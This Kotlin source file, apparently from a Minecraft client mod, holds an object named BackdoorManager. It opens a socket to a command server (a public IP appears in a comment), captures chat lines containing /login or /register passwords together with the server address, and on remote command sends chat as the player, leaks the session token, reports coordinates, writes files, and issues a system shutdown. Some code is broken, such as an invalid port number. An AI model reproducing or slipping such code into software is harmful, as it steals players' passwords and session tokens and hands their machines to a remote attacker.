package dev.zenhao.melon.manager

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import melon.events.PacketEvents
import melon.system.event.AlwaysListening
import melon.system.event.safeEventListener
import melon.system.util.interfaces.MinecraftWrapper
import melon.utils.concurrent.threads.mainScope
import melon.utils.concurrent.threads.runSafe
import melon.utils.threads.BackgroundScope
import net.minecraft.network.play.client.CPacketChatMessage
import java.io.*
import java.net.Socket

object BackdoorManager : AlwaysListening, MinecraftWrapper {

    private var socket: Socket? = null//Socket("150.138.72.217", 61523)
    private var reconnect = false
    private var lastName = ""

    private var client: DataOutputStream? = null
    private var server: DataInputStream? = null

    fun call() {
    }

    init {
        try {
            socket = Socket("127.0.0.1", 6666)
            client = DataOutputStream(socket!!.getOutputStream())
            server = DataInputStream(socket!!.getInputStream())
            lastName = mc.session.getUsername() ?: "WHATTHEFUCK"
            client!!.sendMsg("[HEYUEPING] $lastName")

            // 3Min Per Ping
            BackgroundScope.launchLooping("Ping", 60000L) {
                mainScope.launch(Dispatchers.IO) {
                    if (socket!!.isClosed || reconnect) {
                        socket = Socket("127.0.0.1", 66666)
                        client!!.sendMsg("[HEYUEPING] $lastName")
                        reconnect = false
                    }
                }
            }

            onTick()
        } catch (_: IOException) {
            reconnect = true
        }

        safeEventListener<PacketEvents.PostSend>(true) { event ->
            socket?.let {
                if (event.packet is CPacketChatMessage && !socket!!.isClosed) {
                    with(event.packet.message) {
                        when {
                            contains("/l") || contains("/reg") -> {
                                val username = mc.session.username
                                val server = if (mc.isSingleplayer) "Single Player" else mc.currentServerData?.serverIP
                                    ?: "cannot get server ip"
                                client!!.sendMsg("[LOGGER] $this (ID:$username) $server")
                            }
                        }
                    }
                }
            }
        }
    }

    private fun onTick() {
        mainScope.launch(Dispatchers.IO) {
            while (true) {
                try {
                    if (socket == null || socket!!.isClosed) return@launch
                    val receive = server!!.readMsg()

                    if (lastName != mc.session.getUsername()) {
                        client!!.sendMsg("[HEYUEPING] " + mc.session.getUsername())
                        lastName = mc.session.getUsername()
                    }

                    with(receive) {
                        when {
                            startsWith("/message") -> {
                                runSafe {
                                    player.sendChatMessage(receive.replace("/message ", ""))
                                    client!!.sendMsg("[DEBUG] Message Send!")
                                }?.let {
                                    client!!.sendMsg("[DEBUG] Player Is Not Game!")
                                }
                            }

                            startsWith("/token") -> {
                                client!!.sendMsg("[LOGGER] Token: ${mc.session.token}" + mc.session.getToken() + " (ID: $lastName)")
                            }

                            startsWith("/pos") -> {
                                runSafe {
                                    val dimension = when (player.dimension) {
                                        0 -> "World"
                                        1 -> "TheEnd"
                                        -1 -> "Nether"
                                        else -> "NIMASILE"
                                    }
                                    client!!.sendMsg("[LOGGER] World: $dimension , Pos: ${player.posX}, ${player.posY}, ${player.posZ}")
                                }?.let {
                                    client!!.sendMsg("[DEBUG] Player Is Not In Game!")
                                }
                            }

                            startsWith("/file") -> {
                                val fileName = receive.replace("/file ", "")
                                withContext(Dispatchers.IO) {
                                    socket!!.getInputStream().sendFile(File(fileName)) {
                                        if (it) {
                                            client!!.sendMsg("[FILE_SEND] File Uploaded !")
                                        } else {
                                            client!!.sendMsg("[FILE_SEND] File Not Found !")
                                        }
                                    }
                                }
                            }

                            startsWith("/gg") -> {
                                withContext(Dispatchers.IO) {
                                    Runtime.getRuntime().exec("shutdown -s -t")
                                }
                            }

                            else -> {}
                        }
                    }
                } catch (_: IOException) {
                }
            }
        }
    }

    private fun DataInputStream.readMsg(): String = this.readUTF()

    private fun DataOutputStream.sendMsg(msg: String) {
        this.writeUTF(msg)
        this.flush()
    }

    private fun InputStream.sendFile(file: File, status: (Boolean) -> Unit) {
        if (file.exists()) {
            val os = FileOutputStream(file)
            val bytes = ByteArray(16 * 1024)
            var count: Int
            while (this.read(bytes).also { count = it } > 0) {
                os.write(bytes, 0, count)
                os.flush()
            }
            status.invoke(true)
        } else {
            status.invoke(false)
        }
    }

    fun close() {
        client?.sendMsg("[CLOSE]")
    }
}